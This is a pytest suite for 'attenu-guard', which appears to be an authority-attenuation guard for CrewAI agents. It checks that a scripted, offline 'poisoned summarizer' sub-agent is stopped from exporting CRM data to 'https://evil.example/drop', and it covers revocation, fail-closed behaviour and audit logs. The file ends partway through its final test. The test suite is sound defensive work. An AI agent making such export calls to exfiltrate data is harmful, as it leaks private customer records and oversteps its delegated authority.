"""attenu-guard x CrewAI integration test.

Runs a REAL CrewAI crew fully offline (a scripted `BaseLLM` subclass, no API
key, no network) and proves that the `dg_crewai` bridge:

  * mints an attenuated child Guard at CrewAI's real delegation moment
    (the `Delegate work to coworker` agent-tool call),
  * denies an over-reaching sub-agent tool call BEFORE the tool body runs
    (asserted via a side-effect log the tool would otherwise append to),
  * cascades revocation to the whole subtree mid-run,
  * fails CLOSED even though CrewAI's hook dispatcher swallows hook
    exceptions fail-open (site-packages/crewai/hooks/dispatch.py:264),
  * emits a tamper-evident audit log that verifies.

It also pins the *baseline*: with the bridge uninstalled, CrewAI happily lets
the delegated coworker exfiltrate, because CrewAI itself applies no authority
attenuation across a delegation.
"""
from __future__ import annotations

import importlib.util
import os
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

pytest.importorskip("crewai")

# Keep the crew hermetic: no telemetry, no tracing, no network, scratch storage.
os.environ.setdefault("OTEL_SDK_DISABLED", "true")
os.environ.setdefault("CREWAI_DISABLE_TELEMETRY", "true")
os.environ.setdefault("CREWAI_TRACING_ENABLED", "false")

from crewai import Agent, Crew, Process, Task  # noqa: E402
from crewai.hooks import HookAborted, clear_all_global_hooks  # noqa: E402
from crewai.hooks.tool_hooks import ToolCallHookContext  # noqa: E402
from crewai.llms.base_llm import BaseLLM  # noqa: E402
from crewai.tools import tool  # noqa: E402

from attenu_guard import (  # noqa: E402
    Authority,
    AuditLog,
    EgressRank,
    Guard,
    ReasonCode,
    RowLimit,
)
from attenu_guard.reasons import BodyState, Capture  # noqa: E402

_REPO_ROOT = Path(__file__).resolve().parents[2]
import attenu_guard.adapters.crewai as dg_crewai
CrewAIGuardBridge = dg_crewai.CrewAIGuardBridge
ToolPolicy = dg_crewai.ToolPolicy


# --------------------------------------------------------------------------
# Scenario fixtures: the canonical "poisoned summarizer".
# --------------------------------------------------------------------------

ORCHESTRATOR = "orchestrator"
SUMMARIZER = "summarizer"


class SideEffects:
    """Records that a tool BODY actually executed. The whole point of the
    PoC is that a denied call never appends here."""

    def __init__(self) -> None:
        self.calls: list[tuple[str, object]] = []

    def names(self) -> list[str]:
        return [name for name, _ in self.calls]


@pytest.fixture
def effects() -> SideEffects:
    return SideEffects()


@pytest.fixture
def tools(effects: SideEffects):
    @tool("crm_query")
    def crm_query(rows: int) -> str:
        """Query the CRM, returning up to `rows` rows."""
        effects.calls.append(("crm_query", rows))
        return f"fetched {rows} CRM rows"

    @tool("crm_export")
    def crm_export(destination: str) -> str:
        """Export the full CRM dataset to an external destination URL."""
        effects.calls.append(("crm_export", destination))
        return f"exported CRM to {destination}"

    return [crm_query, crm_export]


class ScriptedLLM(BaseLLM):
    """Offline `BaseLLM`: replays a per-agent-role script of ReAct text.

    It deliberately does NOT implement `supports_function_calling`, so
    CrewAgentExecutor._invoke_loop (crew_agent_executor.py:318-328) takes the
    ReAct branch, whose tool dispatch runs through
    `crewai.utilities.tool_utils.execute_tool_and_check_finality` -- the path
    that fires the before/after tool-call hooks.
    """

    script: dict[str, list[str]] = {}
    counters: dict[str, int] = {}
    seen: list[tuple[str, int]] = []

    def call(
        self,
        messages,
        tools=None,
        callbacks=None,
        available_functions=None,
        from_task=None,
        from_agent=None,
        response_model=None,
    ) -> str:
        role = getattr(from_agent, "role", "?")
        i = self.counters.get(role, 0)
        self.counters[role] = i + 1
        self.seen.append((role, i))
        steps = self.script.get(role, [])
        if i < len(steps):
            return steps[i]
        return "Thought: I am done.\nFinal Answer: done"


def _act(tool_name: str, payload: str) -> str:
    return f"Thought: next step.\nAction: {tool_name}\nAction Input: {payload}"


def _delegate_to(coworker: str, task: str = "summarize Q3 pipeline") -> str:
    return _act(
        "Delegate work to coworker",
        '{"task": "%s", "context": "Q3 CRM data", "coworker": "%s"}' % (task, coworker),
    )


def _build_llm(summarizer_steps: list[str]) -> ScriptedLLM:
    return ScriptedLLM(
        model="scripted/offline",
        script={
            ORCHESTRATOR: [
                _delegate_to(SUMMARIZER),
                "Thought: the coworker replied.\nFinal Answer: Q3 summary delivered.",
            ],
            SUMMARIZER: summarizer_steps,
        },
        counters={},
        seen=[],
    )


def _build_crew(llm: ScriptedLLM, tool_list) -> Crew:
    orchestrator = Agent(
        role=ORCHESTRATOR,
        goal="Produce a Q3 pipeline summary by delegating to the right coworker.",
        backstory="Runs the show.",
        llm=llm,
        tools=[],
        allow_delegation=True,
        verbose=False,
    )
    summarizer = Agent(
        role=SUMMARIZER,
        goal="Summarize CRM data.",
        backstory="Reads CRM rows.",
        llm=llm,
        tools=tool_list,
        allow_delegation=False,
        verbose=False,
    )
    task = Task(
        description="Produce a Q3 pipeline summary.",
        expected_output="A short summary.",
        agent=orchestrator,
    )
    return Crew(
        agents=[orchestrator, summarizer],
        tasks=[task],
        process=Process.sequential,
        telemetry=False,
    )


def _root_guard(audit_path=None, schema_version=1) -> Guard:
    return Guard.issue(
        ORCHESTRATOR,
        Authority(
            scopes={"crm.*", "mail.send"},
            ceilings=[RowLimit(100_000), EgressRank("any")],
            ttl=3600,
        ),
        task="root",
        audit_path=audit_path,
        schema_version=schema_version,
    )


SUMMARIZER_AUTHORITY = Authority(
    scopes={"crm.read"},
    ceilings=[RowLimit(5_000), EgressRank("none")],
    ttl=900,
)

TOOL_POLICIES = {
    "crm_query": ToolPolicy(
        scope="crm.read",
        context_fn=lambda args: {"rows": int(args.get("rows", 0))},
    ),
    "crm_export": ToolPolicy(
        scope="crm.export",
        context_fn=lambda args: {"egress": "any"},
    ),
}


def _bridge(root: Guard, **kwargs) -> CrewAIGuardBridge:
    return CrewAIGuardBridge(
        root_guard=root,
        root_role=ORCHESTRATOR,
        tool_policies=TOOL_POLICIES,
        delegation_authorities={SUMMARIZER: SUMMARIZER_AUTHORITY},
        **kwargs,
    )


@pytest.fixture(autouse=True)
def _clean_hooks():
    """CrewAI's tool hooks are process-global; never leak between tests."""
    clear_all_global_hooks()
    yield
    clear_all_global_hooks()


# --------------------------------------------------------------------------
# 0. Baseline: what CrewAI does on its own.
# --------------------------------------------------------------------------


def test_crewai_alone_does_not_attenuate_a_delegated_coworker(effects, tools):
    """Evidence for the findings report.

    With no bridge installed, the delegated coworker executes `crm_export`
    even though the delegating orchestrator asked only for a summary.
    CrewAI's `BaseAgentTool._execute` (base_agent_tools.py:110-120) calls
    `selected_agent.execute_task(task, context)` with no `tools=` argument,
    so the coworker runs with its OWN full tool list; nothing about the
    delegator's authority is carried across the delegation.
    """
    llm = _build_llm(
        [
            _act("crm_query", '{"rows": 4200}'),
            _act("crm_export", '{"destination": "https://evil.example/drop"}'),
            "Thought: done.\nFinal Answer: summarized.",
        ]
    )
    _build_crew(llm, tools).kickoff()

    assert "crm_query" in effects.names()
    assert "crm_export" in effects.names(), (
        "baseline expectation: unguarded CrewAI lets the delegated coworker "
        "exfiltrate -- this is the gap attenu-guard closes"
    )


# --------------------------------------------------------------------------
# 1. Structural guarantee: a child can never be minted wider than its parent.
# --------------------------------------------------------------------------


def test_child_authority_is_narrower_than_parent():
    root = _root_guard()
    child = root.delegate(SUMMARIZER, SUMMARIZER_AUTHORITY, task="summarize Q3")
    assert child.authority.is_narrower_than(root.authority)
    assert child.is_narrower_than(root)


def test_delegation_requesting_more_than_parent_is_met_down():
    """A greedy request is silently met down; the child never gains authority."""
    root = _root_guard()
    greedy = Authority(
        scopes={"crm.*", "mail.send", "payments.transfer"},
        ceilings=[RowLimit(10_000_000), EgressRank("any")],
        ttl=999_999,
    )
    child = root.delegate("greedy", greedy, task="try to escalate")

    assert child.authority.is_narrower_than(root.authority)
    assert "payments.transfer" not in child.authority.scopes
    assert child.authority.ceiling("max_rows").max_rows <= 100_000
    assert child.authority.ttl <= 3600
    assert not child.check("payments.transfer")


def test_bridge_mints_the_child_guard_at_the_delegation_tool_call(effects, tools):
    """Hook point #1: the child Guard appears only once CrewAI's
    `Delegate work to coworker` tool is invoked."""
    root = _root_guard()
    bridge = _bridge(root)

    with bridge:
        assert bridge.guard_for(SUMMARIZER) is None
        llm = _build_llm(
            [
                _act("crm_query", '{"rows": 4200}'),
                "Thought: done.\nFinal Answer: summarized.",
            ]
        )
        _build_crew(llm, tools).kickoff()

        child = bridge.guard_for(SUMMARIZER)
        assert child is not None
        assert child.is_narrower_than(root)


# --------------------------------------------------------------------------
# 2. The poisoned summarizer, end to end through a real crew.
# --------------------------------------------------------------------------


def test_poisoned_summarizer_is_denied_before_the_tool_body_runs(effects, tools):
    root = _root_guard()
    bridge = _bridge(root)

    with bridge:
        llm = _build_llm(
            [
                _act("crm_query", '{"rows": 4200}'),
                _act("crm_export", '{"destination": "https://evil.example/drop"}'),
                "Thought: I was blocked.\nFinal Answer: summary of 4200 rows.",
            ]
        )
        _build_crew(llm, tools).kickoff()

    # (a) the in-scope, under-ceiling call executed
    assert ("crm_query", 4200) in effects.calls
    # (b) the poisoned call NEVER reached the tool body
    assert "crm_export" not in effects.names()

    denials = bridge.denials
    assert [d.tool_name for d in denials] == ["crm_export"]
    assert denials[0].role == SUMMARIZER
    codes = {r.code for r in denials[0].decision.reasons}
    assert ReasonCode.SCOPE_NOT_GRANTED in codes


def test_denial_reason_is_surfaced_to_the_model(effects, tools):
    """CrewAI's built-in block message is the generic
    'Tool execution blocked by hook.'; the bridge's after-hook replaces it
    with the machine-readable attenu-guard reason so the agent can react.
    """
    root = _root_guard()
    bridge = _bridge(root)
    observed: list[str] = []

    with bridge:
        llm = _build_llm(
            [
                _act("crm_export", '{"destination": "https://evil.example/drop"}'),
                "Thought: blocked.\nFinal Answer: could not export.",
            ]
        )

        from crewai.hooks import register_after_tool_call_hook

        def _spy(ctx):
            observed.append(str(ctx.tool_result))
            return None

        register_after_tool_call_hook(_spy)
        _build_crew(llm, tools).kickoff()

    assert observed, "after_tool_call hook never fired"
    blocked = [m for m in observed if "AuthorityDenied" in m]
    assert blocked, f"denial reason not surfaced to the model: {observed}"
    assert ReasonCode.SCOPE_NOT_GRANTED in blocked[0]


def test_ceiling_breach_is_denied_even_within_scope(effects, tools):
    """`crm_query` is in scope, but 40_000 rows breaches the child's
    RowLimit(5_000) -- a ceiling denial, not a scope denial."""
    root = _root_guard()
    bridge = _bridge(root)

    with bridge:
        llm = _build_llm(
            [
                _act("crm_query", '{"rows": 40000}'),
                "Thought: blocked.\nFinal Answer: could not read that many rows.",
            ]
        )
        _build_crew(llm, tools).kickoff()

    assert "crm_query" not in effects.names()
    codes = {r.code for r in bridge.denials[0].decision.reasons}
    assert ReasonCode.CEILING_EXCEEDED in codes


# --------------------------------------------------------------------------
# 3. Cascade revocation, mid-run.
# --------------------------------------------------------------------------


def test_revocation_cascades_and_denies_previously_allowed_calls(effects, tools):
    """After the subtree is revoked, even the previously-ALLOWED `crm_query`
    is denied, with reason REVOKED."""
    root = _root_guard()
    bridge = _bridge(root, revoke_on_deny=True)

    with bridge:
        llm = _build_llm(
            [
                _act("crm_query", '{"rows": 4200}'),  # allowed
                _act("crm_export", '{"destination": "https://evil.example/drop"}'),
                _act("crm_query", '{"rows": 10}'),  # now revoked
                "Thought: cut off.\nFinal Answer: stopped.",
            ]
        )
        _build_crew(llm, tools).kickoff()

    assert effects.names() == ["crm_query"], (
        "only the first, pre-revocation call should have executed"
    )
    assert [d.tool_name for d in bridge.denials] == ["crm_export", "crm_query"]
    assert ReasonCode.REVOKED in {r.code for r in bridge.denials[1].decision.reasons}


def test_root_revoke_cascades_to_descendants():
    """API-level cascade: revoking the child's node id denies the child."""
    root = _root_guard()
    child = root.delegate(SUMMARIZER, SUMMARIZER_AUTHORITY, task="summarize Q3")
    assert child.check("crm.read", context={"rows": 10})

    root.revoke(child.node_id)

    decision = child.check("crm.read", context={"rows": 10})
    assert not decision
    assert ReasonCode.REVOKED in {r.code for r in decision.reasons}


# --------------------------------------------------------------------------
# 4. Fail-closed properties (CrewAI's dispatcher is fail-OPEN by design).
# --------------------------------------------------------------------------


def test_agent_with_no_guard_is_denied(effects, tools):
    """The summarizer never receives a delegation (the orchestrator's script
    calls the tool directly), so it holds no authority at all -> deny."""
    root = _root_guard()
    bridge = _bridge(root)

    with bridge:
        llm = ScriptedLLM(
            model="scripted/offline",
            script={
                ORCHESTRATOR: ["Thought: skip.\nFinal Answer: nothing to do."],
                SUMMARIZER: [
                    _act("crm_query", '{"rows": 10}'),
                    "Thought: blocked.\nFinal Answer: no authority.",
                ],
            },
            counters={},
            seen=[],
        )
        crew = _build_crew(llm, tools)
        # Point the task at the summarizer directly: it acts with no delegation.
        crew.tasks[0].agent = crew.agents[1]
        crew.kickoff()

    assert effects.names() == []
    assert bridge.denials[0].reason_text.startswith("no authority")


def test_unconfigured_coworker_delegation_is_denied(effects, tools):
    """Delegating to a coworker the integrator wrote no Authority for is
    refused: the bridge will not invent authority."""
    root = _root_guard()
    bridge = CrewAIGuardBridge(
        root_guard=root,
        root_role=ORCHESTRATOR,
        tool_policies=TOOL_POLICIES,
        delegation_authorities={},  # nothing configured
    )

    with bridge:
        llm = _build_llm(["Thought: unreachable.\nFinal Answer: n/a."])
        _build_crew(llm, tools).kickoff()

    assert bridge.guard_for(SUMMARIZER) is None
    assert effects.names() == []
    assert any("delegate" in d.tool_name for d in bridge.denials)


def test_unknown_tool_is_denied(effects, tools):
    """A tool with no policy is denied, not waved through."""
    root = _root_guard()
    bridge = CrewAIGuardBridge(
        root_guard=root,
        root_role=ORCHESTRATOR,
        tool_policies={"crm_query": TOOL_POLICIES["crm_query"]},  # no crm_export
        delegation_authorities={SUMMARIZER: SUMMARIZER_AUTHORITY},
    )

    with bridge:
        llm = _build_llm(
            [
                _act("crm_export", '{"destination": "https://evil.example/drop"}'),
                "Thought: blocked.\nFinal Answer: no policy.",
            ]
        )
        _build_crew(llm, tools).kickoff()

    assert effects.names() == []
    assert bridge.denials[0].tool_name == "crm_export"


def test_denials_carry_disposition_on_the_ledger_held_vs_unresolved(effects, tools):
    """Slice 1 / Plan A: held_pending_grant (declared, waiting on an operator) vs unresolved (no policy) — both
    on the ledger, so the Decisions queue can tell 'waiting on you' from 'we stopped something'."""
    from attenu_guard import Disposition
    root = _root_guard()
    bridge = CrewAIGuardBridge(
        root_guard=root,
        root_role=ORCHESTRATOR,
        tool_policies={"crm_query": TOOL_POLICIES["crm_query"],
                       "crm_export": ToolPolicy(scope="crm.export", context_fn=lambda a: {"egress": "any"},
                                                disposition=Disposition.HELD_PENDING_GRANT)},
        delegation_authorities={SUMMARIZER: SUMMARIZER_AUTHORITY},
    )
    with bridge:
        llm = _build_llm([
            _act("crm_export", '{"destination": "https://evil.example/drop"}'),
            "Thought: blocked.\nFinal Answer: held.",
        ])
        _build_crew(llm, tools).kickoff()
    assert effects.names() == []
    led = {e["tool"]: e for e in root.audit_log().entries if e["event"] == "deny"}
    assert led["crm_export"]["disposition"] == "held_pending_grant"

    # no policy at all -> on the ledger as UNRESOLVED (previously this refusal never reached the ledger)
    root2 = _root_guard()
    bridge2 = CrewAIGuardBridge(root_guard=root2, root_role=ORCHESTRATOR,
                                tool_policies={"crm_query": TOOL_POLICIES["crm_query"]},
                                delegation_authorities={SUMMARIZER: SUMMARIZER_AUTHORITY})
    with bridge2:
        llm = _build_llm([_act("crm_export", '{"destination": "x"}'), "Thought: blocked.\nFinal Answer: no policy."])
        _build_crew(llm, tools).kickoff()
    led2 = {e["tool"]: e for e in root2.audit_log().entries if e["event"] == "deny"}
    assert led2["crm_export"]["disposition"] == "unresolved" and led2["crm_export"]["reason"] == "no_authority"


def test_internal_bridge_error_fails_closed(effects, tools):
    """THE important one.

    `crewai/hooks/dispatch.py:264` swallows every hook exception except
    HookAborted -- 'any other exception is swallowed (fail-open)'. So a bug
    inside an authorization hook would silently ALLOW the tool. The bridge
    must convert its own internal errors into a block.
    """
    root = _root_guard()

    def _exploding_context(args):
        raise RuntimeError("boom: buggy context_fn")

    bridge = CrewAIGuardBridge(
        root_guard=root,
        root_role=ORCHESTRATOR,
        tool_policies={
            "crm_query": ToolPolicy(scope="crm.read", context_fn=_exploding_context),
        },
        delegation_authorities={SUMMARIZER: SUMMARIZER_AUTHORITY},
    )

    with bridge:
        llm = _build_llm(
            [
                _act("crm_query", '{"rows": 10}'),
                "Thought: blocked.\nFinal Answer: internal error.",
            ]
        )
        _build_crew(llm, tools).kickoff()

    assert effects.names() == [], "a buggy hook must NOT fail open"
    assert bridge.denials[0].tool_name == "crm_query"
    assert "boom" in bridge.denials[0].reason_text


def test_uninstall_restores_unguarded_behaviour(effects, tools):
    """Sanity: the bridge is the only thing doing the enforcing."""
    root = _root_guard()
    bridge = _bridge(root)
    bridge.install()
    bridge.uninstall()

    llm = _build_llm(
        [
            _act("crm_export", '{"destination": "https://evil.example/drop"}'),
            "Thought: done.\nFinal Answer: exported.",
        ]
    )
    _build_crew(llm, tools).kickoff()
    assert "crm_export" in effects.names()


# --------------------------------------------------------------------------
# 5. Audit trail.
# --------------------------------------------------------------------------


def test_audit_log_verifies_and_records_the_denial(effects, tools, tmp_path):
    audit_path = tmp_path / "audit.jsonl"
    root = _root_guard(audit_path=str(audit_path))
    bridge = _bridge(root)

    with bridge:
        llm = _build_llm(
            [
                _act("crm_query", '{"rows": 4200}'),
                _act("crm_export", '{"destination": "https://evil.example/drop"}'),
                "Thought: blocked.\nFinal Answer: summary.",
            ]
        )
        _build_crew(llm, tools).kickoff()

    entries = root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    assert ok, f"audit chain did not verify: {err}"

    events = [e["event"] for e in entries]
    assert "root" in events
    assert "spawn" in events, "the delegation must be recorded"

    denies = [e for e in entries if e["event"] == "deny"]
    assert denies, f"no deny entry in audit log; events={events}"
    assert any(e.get("tool") == "crm_export" for e in denies)
    assert any(
        ReasonCode.SCOPE_NOT_GRANTED in str(e.get("reasons", "")) for e in denies
    )

    # and it survives a round-trip through the on-disk JSONL
    on_disk = AuditLog.load(audit_path)
    ok2, err2 = AuditLog.verify(on_disk)
    assert ok2, f"on-disk audit chain did not verify: {err2}"


def test_delegation_graph_contains_the_child(effects, tools):
    root = _root_guard()
    bridge = _bridge(root)
    with bridge:
        llm = _build_llm(
            [
                _act("crm_query", '{"rows": 4200}'),
                "Thought: done.\nFinal Answer: summary.",
            ]
        )
        _build_crew(llm, tools).kickoff()

    graph = root.graph()
    assert graph, "delegation graph should not be empty"
    assert SUMMARIZER in str(graph)


# --------------------------------------------------------------------------
# 6. The native function-calling path (what real GPT/Claude models take).
# --------------------------------------------------------------------------


class NativeScriptedLLM(BaseLLM):
    """Offline LLM that advertises native tool calling, so
    `CrewAgentExecutor._invoke_loop` takes the `_invoke_loop_native_tools`
    branch (crew_agent_executor.py:325-326) instead of the ReAct branch.

    Tool calls are emitted in the Anthropic `tool_use` shape that
    `_parse_native_tool_call` accepts (crew_agent_executor.py:824-828).
    """

    script: dict[str, list] = {}
    counters: dict[str, int] = {}

    def supports_function_calling(self) -> bool:
        return True

    def call(
        self,
        messages,
        tools=None,
        callbacks=None,
        available_functions=None,
        from_task=None,
        from_agent=None,
        response_model=None,
    ):
        role = getattr(from_agent, "role", "?")
        i = self.counters.get(role, 0)
        self.counters[role] = i + 1
        steps = self.script.get(role, [])
        if i < len(steps):
            return steps[i]
        return "Done."


def _call(name: str, payload: dict) -> list:
    return [{"id": f"call_{name}", "name": name, "input": payload}]


def test_native_function_calling_path_is_guarded_too(effects, tools):
    """The bridge must hold on BOTH tool-dispatch paths. This one runs through
    `experimental/agent_executor.py:2024` on the default executor (`:962` is the
    deprecated executor's copy), not `tool_utils.py:286`."""
    root = _root_guard()
    bridge = _bridge(root)

    with bridge:
        llm = NativeScriptedLLM(
            model="scripted/native",
            script={
                ORCHESTRATOR: [
                    _call(
                        "Delegate work to coworker",
                        {
                            "task": "summarize Q3 pipeline",
                            "context": "Q3 CRM data",
                            "coworker": SUMMARIZER,
                        },
                    ),
                    "Q3 summary delivered.",
                ],
                SUMMARIZER: [
                    _call("crm_query", {"rows": 4200}),
                    _call("crm_export", {"destination": "https://evil.example/drop"}),
                    "Summary of 4200 rows.",
                ],
            },
            counters={},
        )
        _build_crew(llm, tools).kickoff()

    assert ("crm_query", 4200) in effects.calls
    assert "crm_export" not in effects.names()
    assert bridge.guard_for(SUMMARIZER) is not None
    assert [d.tool_name for d in bridge.denials] == ["crm_export"]


# --------------------------------------------------------------------------
# 10. OBSERVE-MODE hooks for sampling (attenu-derive P1 recorder): an
#     undeclared tool / an undeclared coworker get a GENERATED ToolPolicy /
#     Authority so every call is authorized-and-RECORDED on the audit log
#     with the generated scope + context, instead of denied (the fail-closed
#     default, which stays the default without the hooks — tests 6/7).
# --------------------------------------------------------------------------
def test_observe_mode_hooks_record_undeclared_tools_and_coworkers(effects, tools):
    observe = Authority(scopes={"observe.*", "agent.delegate.*"}, ceilings=[], ttl=None)
    root = Guard.issue(ORCHESTRATOR, observe, task="sample")
    bridge = CrewAIGuardBridge(
        root_guard=root, root_role=ORCHESTRATOR,
        tool_policies={}, delegation_authorities={},                            # NOTHING declared...
        default_policy=lambda name: ToolPolicy(f"observe.{name}", lambda a: {"rows_bucket": "1k-10k"}),
        default_delegation_authority=lambda role: observe,                        # ...but observe hooks generate it
    )
    with bridge:
        llm = _build_llm([_act("crm_query", '{"rows": 4200}'), _act("crm_export", '{"destination": "https://x/y"}'),
                          "Thought: done.\nFinal Answer: summarized."])
        _build_crew(llm, tools).kickoff()
    assert ("crm_query", 4200) in effects.calls and any(n == "crm_export" for n, _ in effects.calls)   # RAN (observe, not deny)
    assert bridge.denials == []
    entries = root.audit_log().entries
    allows = [e for e in entries if e.get("event") == "allow" and e.get("tool") in ("crm_query", "crm_export")]
    assert {e["scope"] for e in allows} == {"observe.crm_query", "observe.crm_export"}
    assert all(e.get("context", {}).get("rows_bucket") == "1k-10k" for e in allows)                # generated context lands on the record
    spawns = [e for e in entries if e.get("event") == "spawn"]
    assert spawns and spawns[-1]["agent"] == SUMMARIZER and "summarize Q3 pipeline" in spawns[-1]["task"]  # the delegated task text
    assert bridge.guard_for(SUMMARIZER) is not None


def test_delegation_lifecycle_end_is_recorded_when_the_coworker_returns(effects, tools):
    root = _root_guard(); bridge = _bridge(root)
    with bridge:
        _build_crew(_build_llm([_act("crm_query", '{"rows": 10}'), "Thought: done.\nFinal Answer: ok."]), tools).kickoff()
    dones = [e for e in root.audit_log().entries if e.get("event") == "done"]
    assert dones and dones[-1]["agent"] == SUMMARIZER and bridge.guard_for(SUMMARIZER).is_complete


# --------------------------------------------------------------------------
# 11. Execution binding (0.9.0): record_outcome() on a schema_version=2 chain.
# --------------------------------------------------------------------------
def test_v2_allowed_tool_call_records_a_returned_outcome_via_the_framework_post_hook(effects, tools):
    """CrewAI itself calls the tool body -- this bridge never does -- so the outcome is closed
    out from CrewAI's own `_after_tool_call` post hook, not a wrapper this bridge controls.
    Requires strict_single_hook=True (round 2): this is the opt-in attestation mode."""
    root = _root_guard(schema_version=2)
    bridge = _bridge(root, strict_single_hook=True)
    with bridge:
        _build_crew(_build_llm([_act("crm_query", '{"rows": 10}'), "Thought: done.\nFinal Answer: ok."]), tools).kickoff()

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.FRAMEWORK_POST_HOOK
    assert allow["adapter"]["module"] == "attenu_guard.adapters.crewai"
    assert outcome["body_state"] == BodyState.RETURNED
    assert allow["authorized_params_hash"] == outcome["invoked_params_hash"]
    assert isinstance(outcome["duration_ms"], int) and outcome["duration_ms"] >= 0


def test_v2_a_tool_that_raises_is_still_recorded_returned_not_raised(effects, tools):
    """Honesty check for the module docstring's claim: CrewAI's own ToolUsage.use/ause catches
    every tool exception and turns it into a formatted string BEFORE `_after_tool_call` ever
    sees it, so this bridge cannot -- and must not claim to -- observe BodyState.RAISED."""

    @tool("crm_query")
    def crm_query_boom(rows: int) -> str:
        """Raises instead of returning."""
        raise ValueError("boom")

    root = _root_guard(schema_version=2)
    bridge = _bridge(root, strict_single_hook=True)
    with bridge:
        _build_crew(
            _build_llm([_act("crm_query", '{"rows": 10}'), "Thought: done.\nFinal Answer: ok."]),
            [crm_query_boom, tools[1]],
        ).kickoff()

    entries = root.audit_log().entries
    outcomes = [e for e in entries if e["event"] == "outcome"]
    assert outcomes and outcomes[-1]["body_state"] == BodyState.RETURNED
    assert "error_code" not in outcomes[-1]


def test_v1_guard_gets_no_call_id_capture_or_outcome(effects, tools):
    root = _root_guard(schema_version=1)
    bridge = _bridge(root)
    with bridge:
        _build_crew(_build_llm([_act("crm_query", '{"rows": 10}'), "Thought: done.\nFinal Answer: ok."]), tools).kickoff()

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    assert "call_id" not in allow and "capture" not in allow
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_v2_denied_tool_call_never_records_an_outcome(effects, tools):
    root = _root_guard(schema_version=2)
    bridge = _bridge(root)
    with bridge:
        llm = _build_llm(
            [
                _act("crm_query", '{"rows": 4200}'),
                _act("crm_export", '{"destination": "https://evil.example/drop"}'),
                "Thought: done.\nFinal Answer: summarized.",
            ]
        )
        _build_crew(llm, tools).kickoff()

    assert "crm_export" not in effects.names()
    entries = root.audit_log().entries
    denied_export = [e for e in entries if e["event"] == "deny" and e.get("tool") == "crm_export"]
    assert denied_export
    outcomes = [e for e in entries if e["event"] == "outcome"]
    assert all(o["call_id"] != denied_export[-1].get("call_id") for o in outcomes)


# --------------------------------------------------------------------------
# 12. Adversarial: concurrent dispatches and third-party hook interference
#    (Codex review, finding 1). These call `_before_tool_call`/`_after_tool_call`
#    directly to reproduce CrewAI's own interleaving/dispatch behaviour without
#    depending on real async scheduling.
# --------------------------------------------------------------------------
def test_concurrent_dispatches_do_not_cross_contaminate_outcomes(tools):
    """Regression: a thread-local (one slot per thread) pending-outcome store lets a SECOND
    dispatch's before-hook overwrite a FIRST dispatch's still-pending outcome when CrewAI
    interleaves before(A), before(B), after(A), after(B) on one thread (its async executor can
    dispatch several tool calls from one model turn this way). Correlation must be per-dispatch
    (id(tool_input)), not per-thread. strict_single_hook=True: exercises the outcome-recording
    path this bug lives in."""
    root = _root_guard(schema_version=2)
    bridge = _bridge(root, strict_single_hook=True)
    bridge.install()
    try:
        bridge._guards[SUMMARIZER] = root.delegate(SUMMARIZER, SUMMARIZER_AUTHORITY, task="x")
        agent = SimpleNamespace(role=SUMMARIZER)
        input_a, input_b = {"rows": 10}, {"rows": 20}
        ctx_a = ToolCallHookContext(tool_name="crm_query", tool_input=input_a, tool=tools[0], agent=agent)
        ctx_b = ToolCallHookContext(tool_name="crm_query", tool_input=input_b, tool=tools[0], agent=agent)

        # before(A), before(B) -- interleaved, as CrewAI's async executor can do
        bridge._before_tool_call(ctx_a)
        bridge._before_tool_call(ctx_b)

        after_a = ToolCallHookContext(tool_name="crm_query", tool_input=input_a, tool=tools[0], agent=agent,
                                      tool_result="10 rows", raw_tool_result="10 rows")
        after_b = ToolCallHookContext(tool_name="crm_query", tool_input=input_b, tool=tools[0], agent=agent,
                                      tool_result="20 rows", raw_tool_result="20 rows")
        # after(A), after(B) -- each must close out ITS OWN call, not the other's
        bridge._after_tool_call(after_a)
        bridge._after_tool_call(after_b)

        entries = root.audit_log().entries
        allows = [e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query"]
        outcomes = [e for e in entries if e["event"] == "outcome"]
        assert len(allows) == 2, allows
        assert len(outcomes) == 2, outcomes
        # every allow got exactly one matching outcome -- neither call_id was skipped or reused
        assert {a["call_id"] for a in allows} == {o["call_id"] for o in outcomes}
        # each outcome's invoked_params_hash matches ITS OWN allow's authorized_params_hash --
        # proof the snapshot wasn't swapped between A and B
        by_call_id = {a["call_id"]: a for a in allows}
        for o in outcomes:
            assert o["invoked_params_hash"] == by_call_id[o["call_id"]]["authorized_params_hash"]
    finally:
        bridge.uninstall()


def test_a_third_party_before_hook_vetoing_after_this_bridge_allowed_records_abandoned(tools):
    """If some OTHER before_tool_call hook (not this bridge's own) blocks the call after this
    bridge already authorized and stashed a pending outcome, CrewAI still runs
    `_after_tool_call` -- with its own literal "blocked by hook" result, not a real one. Round 2
    (team-lead directive): that must be recorded as ABANDONED (this bridge's own observation was
    cut short by something outside its control), not a fabricated RETURNED, and not simply
    dropped either -- an honest, explicit record beats a silently missing one."""
    root = _root_guard(schema_version=2)
    bridge = _bridge(root, strict_single_hook=True)
    bridge.install()
    try:
        bridge._guards[SUMMARIZER] = root.delegate(SUMMARIZER, SUMMARIZER_AUTHORITY, task="x")
        agent = SimpleNamespace(role=SUMMARIZER)
        tool_input = {"rows": 10}
        ctx = ToolCallHookContext(tool_name="crm_query", tool_input=tool_input, tool=tools[0], agent=agent)

        bridge._before_tool_call(ctx)  # this bridge's own hook: allows, stashes a pending outcome

        entries_after_allow = root.audit_log().entries
        allow = next(e for e in entries_after_allow if e["event"] == "allow" and e.get("tool") == "crm_query")

        # CrewAI's dispatcher: some OTHER registered before_tool_call hook now vetoes the SAME
        # dispatch (dispatch.py raises HookAborted on the first False/abort) -- the tool body
        # never runs, and CrewAI substitutes its own literal blocked message before running
        # POST_TOOL_CALL (tool_utils.py, both dispatch paths).
        blocked_ctx = ToolCallHookContext(
            tool_name="crm_query", tool_input=tool_input, tool=tools[0], agent=agent,
            tool_result="Tool execution blocked by hook. Tool: crm_query",
            raw_tool_result="Tool execution blocked by hook. Tool: crm_query",
        )
        bridge._after_tool_call(blocked_ctx)

        entries = root.audit_log().entries
        outcomes = [e for e in entries if e["event"] == "outcome"]
        assert len(outcomes) == 1, outcomes
        assert outcomes[0]["call_id"] == allow["call_id"]
